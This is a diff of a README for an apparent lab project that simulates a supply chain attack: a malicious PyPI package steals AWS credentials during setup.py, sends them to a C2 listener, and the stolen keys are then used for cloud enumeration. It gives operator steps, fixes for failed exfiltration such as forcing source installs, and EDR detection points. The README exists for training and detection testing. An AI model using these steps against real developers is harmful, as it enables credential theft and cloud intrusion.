@@ -1,127 +1,346 @@
-# Supply Chain Attack Demo - Malicious Package to Cloud Exploitation
+# Supply Chain Attack Demo
 
-Demonstrates a realistic supply chain attack: malicious package installation → AWS credential theft → cloud enumeration.
+> **Production-ready educational security testing platform demonstrating supply chain attacks**
 
-## Attack Flow
+[![Tested](https://img.shields.io/badge/status-tested-success)](https://github.com/norsemen-local/supply-chain-attack-demo)
+[![Demo Time](https://img.shields.io/badge/demo%20time-~5%20minutes-blue)](https://github.com/norsemen-local/supply-chain-attack-demo)
+[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey)](https://github.com/norsemen-local/supply-chain-attack-demo)
+
+## 🎯 Overview
+
+A complete end-to-end simulation demonstrating a realistic supply chain attack:
+
+**Malicious PyPI Package → Credential Theft → Cloud Enumeration**
+
+### Attack Chain
 
 ```
-Developer Endpoint → Malicious PyPI Package → C2 Server (Fake WAN) → AWS Cloud Enumeration
+┌─────────────────┐      ┌──────────────────┐      ┌─────────────────┐
+│  C2 Server      │      │  Victim Machine  │      │  AWS Cloud      │
+│  (Linux)        │◄─────┤  (Windows/Linux) │      │                 │
+│                 │      │                  │      │                 │
+│ • PyPI Server   │ Creds│ • pip install    │ Enum │ • S3 Buckets    │
+│   (port 8080)   │◄─────┤ • aws-data-utils │─────►│ • IAM Users     │
+│ • C2 Listener   │      │ • Credentials    │      │ • EC2 Instances │
+│   (port 4444)   │      │   stolen         │      │                 │
+└─────────────────┘      └──────────────────┘      └─────────────────┘
 ```
 
-**Phase 1**: Developer installs package from attacker-controlled PyPI server
-**Phase 2**: Malicious package steals AWS credentials during installation
-**Phase 3**: Credentials exfiltrated to C2 server in fake WAN network
-**Phase 4**: Attacker uses stolen credentials for AWS enumeration
+**Phases:**
+1. **Infrastructure** - C2 server hosts malicious PyPI repository
+2. **Infection** - Victim installs package, credentials stolen during `setup.py` execution
+3. **Exfiltration** - Credentials sent to C2 server over network
+4. **Exploitation** - Attacker enumerates AWS resources using stolen credentials
 
-## Project Structure
+---
+
+## 📁 Project Structure
 
 ```
-python-pack/
+supply-chain-attack-demo/
 ├── README.md                          # This file
-├── 1-attacker-infrastructure/         # C2 + PyPI server (fake WAN)
-│   ├── c2_server.py                   # Credential receiver + PyPI server
-│   ├── start_infrastructure.sh        # Launch attacker infrastructure
-│   └── requirements.txt               # Server dependencies
-├── 2-malicious-package/               # Supply chain attack package
-│   ├── setup.py                       # Steals credentials on install
-│   ├── aws_data_utils/                # Realistic package name
-│   │   └── __init__.py                # Runtime credential theft
-│   └── build_and_upload.sh            # Build package for PyPI server
-├── 3-victim-application/              # Developer's legitimate app
-│   ├── requirements.txt               # Includes malicious dependency
-│   ├── app.py                         # Simple data processing app
-│   └── setup_victim.sh                # Configure to use attacker PyPI
-├── 4-attacker-operations/             # Cloud attack phase
-│   ├── enumerate_aws.py               # AWS enumeration
-│   ├── requirements.txt               # boto3
-│   └── run_attack.sh                  # Execute cloud operations
-├── 5-aws-infrastructure/              # Victim AWS environment
-│   ├── restricted_user.json           # IAM policy (read-only)
-│   └── setup_aws.sh                   # Create restricted IAM user
-└── demo_full_attack.sh                # Complete end-to-end demo
+├── EXECUTION_GUIDE.md                 # Detailed step-by-step instructions
+├── WARP.md                            # Troubleshooting & agent instructions
+├── DEPLOYMENT_READY.md                # Deployment checklist
+├── QUICK_START_CHECKLIST.md           # Quick reference
+├── demo_aws_credentials.template      # AWS credentials template
+│
+├── 1-attacker-infrastructure/         # C2 server (Linux)
+│   ├── quick_demo.sh                  # 🚀 AUTOMATED SETUP (recommended)
+│   ├── c2_listener_only.py            # Standalone C2 listener
+│   ├── c2_server.py                   # Combined C2 + PyPI server
+│   ├── start_c2_only.sh               # Start C2 only
+│   ├── start_pypi_only.sh             # Start PyPI only
+│   └── requirements.txt               # Python dependencies
+│
+├── 2-malicious-package/               # Malicious package source
+│   ├── build_and_upload.sh            # Build package with embedded C2 IP
+│   ├── setup.py                       # Steals credentials during install
+│   └── aws_data_utils/
+│       └── __init__.py                # Package implementation
+│
+├── 3-victim-application/              # Victim machine setup (Windows/Linux)
+│   ├── setup_aws_creds.ps1            # Setup fake AWS credentials (Windows)
+│   ├── setup_victim.ps1               # Configure pip (Windows)
+│   ├── trigger_attack.ps1             # 🚀 Execute attack (Windows)
+│   ├── setup_victim.sh                # Configure pip (Linux)
+│   ├── app.py                         # Demo application
+│   └── requirements.txt               # Includes malicious dependency
+│
+├── 4-attacker-operations/             # Post-exploitation
+│   ├── run_attack.sh                  # AWS enumeration script
+│   ├── enumerate_aws.py               # AWS resource enumeration
+│   └── requirements.txt               # boto3 dependency
+│
+└── 5-aws-infrastructure/              # AWS setup (optional)
+    ├── setup_aws.sh                   # Create restricted IAM user
+    ├── demo_aws_credentials           # Demo credentials
+    └── restricted_user_policy.json    # Read-only IAM policy
 ```
 
-## Prerequisites
+---
 
-- **C2/Attacker Machine**: Python 3.8+, on separate network (fake WAN)
-- **Victim Endpoint**: Python 3.8+, Windows or Linux with Cortex XDR
-- **AWS Account**: For creating restricted IAM user
+## 🚀 Quick Start (5 Minutes)
 
-## Quick Start
+### Prerequisites
 
-### 1. Setup Attacker Infrastructure (C2 Server - Fake WAN)
+- **C2 Server**: Linux machine with Python 3.8+, tmux
+- **Victim Machine**: Windows or Linux with Python 3.8+, pip
+- **Network**: Both machines can communicate
+- **Optional**: AWS account for phase 4 (cloud enumeration)
+
+---
+
+## 📋 Execution Steps
+
+### **Phase 1: C2 Server Setup (Linux)**
+
+**Option A: Automated (Recommended)**
 
 ```bash
-cd 1-attacker-infrastructure/
-pip install -r requirements.txt
-./start_infrastructure.sh
-# Note the C2 server IP for victim configuration
+cd ~/supply-chain-attack-demo/1-attacker-infrastructure
+./quick_demo.sh <C2_SERVER_IP>
 ```
 
-### 2. Setup AWS Restricted User (One-time)
+**What it does:**
+- Builds malicious package with embedded C2 IP
+- Starts PyPI server (port 8080) in tmux session `pypi`
+- Starts C2 listener (port 4444) in tmux session `c2`
 
+**View logs:**
 ```bash
-cd 5-aws-infrastructure/
-./setup_aws.sh
-# Saves credentials to victim endpoint
+tmux attach -t pypi   # View PyPI server logs
+tmux attach -t c2     # View C2 listener logs
+# Detach: Ctrl+B then D
 ```
 
-### 3. Build Malicious Package
+**Option B: Manual Setup**
 
-```bash
-cd 2-malicious-package/
-# Edit setup.py to set C2_SERVER_IP
-./build_and_upload.sh <C2_SERVER_IP>
+See [EXECUTION_GUIDE.md](EXECUTION_GUIDE.md) for manual setup instructions.
+
+---
+
+### **Phase 2: Victim Setup & Attack**
+
+#### **On Windows Victim:**
+
+```powershell
+cd C:\path\to\supply-chain-attack-demo\3-victim-application
+
+# Step 1: Setup AWS credentials (one-time)
+.\setup_aws_creds.ps1
+
+# Step 2: Configure pip to use attacker's PyPI
+.\setup_victim.ps1 <C2_SERVER_IP>
+
+# Step 3: Trigger attack
+.\trigger_attack.ps1 <C2_SERVER_IP>
 ```
 
-### 4. Setup Victim Endpoint
+#### **On Linux Victim:**
 
 ```bash
-cd 3-victim-application/
+cd ~/supply-chain-attack-demo/3-victim-application
+
+# Step 1: Setup AWS credentials
+mkdir -p ~/.aws
+cp ../5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials
+
+# Step 2: Configure pip
 ./setup_victim.sh <C2_SERVER_IP>
+
+# Step 3: Trigger attack
+export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf
+pip install -r requirements.txt
 ```
 
-### 5. Trigger Attack
+---
+
+### **Phase 3: Verify Credential Theft**
+
+**On C2 Server:**
 
 ```bash
-# On victim endpoint
-cd 3-victim-application/
-pip install -r requirements.txt  # Steals credentials
-python app.py                     # Runtime exfiltration (optional)
+# Check C2 listener output
+tmux attach -t c2
+# Look for: "Credentials stolen!"
 
-# On attacker C2 (after credentials received)
-cd 4-attacker-operations/
+# View stolen credentials
+cat ~/supply-chain-attack-demo/1-attacker-infrastructure/stolen_aws_credentials
+```
+
+---
+
+### **Phase 4: AWS Enumeration (Optional)**
+
+**On C2 Server:**
+
+```bash
+cd ~/supply-chain-attack-demo/4-attacker-operations
 ./run_attack.sh
 ```
 
-## Detection Opportunities
+**Enumerates:**
+- S3 buckets
+- IAM users
+- EC2 instances
+- Other AWS resources
 
-### Cortex XDR Should Detect:
-- **Phase 1**: Suspicious network connection during package installation
-- **Phase 2**: Python process accessing `~/.aws/credentials`
-- **Phase 3**: Outbound connection to unusual IP during pip install
-- **Phase 4**: AWS API enumeration from unexpected source IP
-- **Phase 4**: High-volume AWS API calls (enumeration pattern)
+---
 
-## Security Notes
+## ✅ Success Indicators
 
-⚠️ **CONTROLLED LAB ENVIRONMENT ONLY**
-- Restricted IAM user has ONLY read permissions (List/Get/Describe)
-- No destructive AWS operations possible
-- Malicious package only exfiltrates to designated C2
-- All activities monitored by Cortex XDR
+- ✅ C2 listener shows "Credentials stolen!" message
+- ✅ File created: `1-attacker-infrastructure/stolen_aws_credentials`
+- ✅ Victim machine shows package installation completed
+- ✅ AWS enumeration script runs without errors
+- ✅ Cortex XDR alerts visible (if enabled)
 
-## Cleanup
+---
+
+## 🔧 Troubleshooting
+
+### Common Issues
+
+**Issue: Credentials not exfiltrated**
+- Pip cached wheel instead of source distribution
+- **Fix:** Run `pip cache purge` and reinstall with `--no-binary` flag
+- See [WARP.md](WARP.md#issue-1-credentials-not-exfiltrated) for details
+
+**Issue: "Using cached wheel"**
+- **Fix:** `trigger_attack.ps1` automatically clears cache
+- Manual: `pip cache purge && pip uninstall aws-data-utils -y`
+
+**Issue: PyPI server not accessible**
+- **Fix:** Check firewall, verify port 8080 open: `netstat -tuln | grep 8080`
+
+**Issue: C2 connection refused**
+- **Fix:** Verify C2 listener running: `netstat -tuln | grep 4444`
+
+**Full troubleshooting guide:** [WARP.md](WARP.md#troubleshooting)
+
+---
+
+## 🧹 Cleanup
+
+### **Victim Machine:**
+
+```powershell
+# Windows
+pip uninstall aws-data-utils -y
+Remove-Item ~\.aws\credentials -Force
+```
 
 ```bash
-# Remove attacker package from victim
+# Linux
 pip uninstall aws-data-utils -y
+rm ~/.aws/credentials
+```
 
-# Stop C2 server
-pkill -f c2_server.py
+### **C2 Server:**
 
-# Delete AWS IAM user (optional)
+```bash
+# Stop tmux sessions
+tmux kill-session -t pypi
+tmux kill-session -t c2
+
+# Remove stolen credentials
+rm ~/supply-chain-attack-demo/1-attacker-infrastructure/stolen_*
+
+# Remove built packages (optional)
+rm -rf ~/supply-chain-attack-demo/1-attacker-infrastructure/packages/
+```
+
+### **AWS Cleanup (if using real credentials):**
+
+```bash
 aws iam delete-access-key --user-name demo-restricted-user --access-key-id <KEY_ID>
 aws iam detach-user-policy --user-name demo-restricted-user --policy-arn <POLICY_ARN>
 aws iam delete-user --user-name demo-restricted-user
 ```
+
+---
+
+## 🛡️ Detection Opportunities
+
+### EDR/XDR Detection Points:
+
+**Phase 1: Package Installation**
+- Suspicious network connection during `pip install`
+- Source distribution installation (not wheel)
+- Connection to non-standard PyPI server
+
+**Phase 2: Credential Access**
+- Python process accessing `~/.aws/credentials`
+- File read from sensitive credential locations
+- Unusual process tree (`pip` → `python setup.py`)
+
+**Phase 3: Exfiltration**
+- Outbound connection to unknown IP during package install
+- Data transmission to non-corporate destination
+- Network connection from `setup.py` script
+
+**Phase 4: Cloud Abuse**
+- AWS API enumeration from unexpected source IP
+- High-volume AWS API calls (enumeration pattern)
+- Access to multiple AWS services in short timeframe
+
+### Cortex XDR Alerts Expected:
+- Process execution chain anomaly
+- Sensitive file access
+- Network connection to suspicious endpoint
+- AWS API abuse pattern
+
+---
+
+## ⚠️ Security & Ethics
+
+### **Lab Environment Only**
+
+- ✅ Use only in isolated lab environments
+- ✅ Restricted IAM credentials with **read-only** permissions
+- ✅ No production systems or credentials
+- ✅ All activities monitored and logged
+
+### **Educational Purpose**
+
+This project is designed for:
+- Security awareness training
+- Red team / blue team exercises
+- EDR/XDR detection testing
+- Supply chain attack research
+
+**Do NOT use for malicious purposes.**
+
+---
+
+## 📚 Documentation
+
+- **[EXECUTION_GUIDE.md](EXECUTION_GUIDE.md)** - Detailed step-by-step instructions
+- **[WARP.md](WARP.md)** - Complete troubleshooting guide
+- **[DEPLOYMENT_READY.md](DEPLOYMENT_READY.md)** - Deployment checklist
+- **[QUICK_START_CHECKLIST.md](QUICK_START_CHECKLIST.md)** - Quick reference card
+
+---
+
+## 🤝 Contributing
+
+Contributions welcome! Please ensure:
+- All changes maintain educational/research focus
+- Code follows existing patterns
+- Documentation updated accordingly
+- Security considerations addressed
+
+---
+
+## 📄 License
+
+This project is provided for educational and research purposes. Use responsibly.
+
+---
+
+## 🙏 Acknowledgments
+
+Developed for cybersecurity education and defensive security testing.
+
+**Co-Authored-By: Warp <agent@warp.dev>**
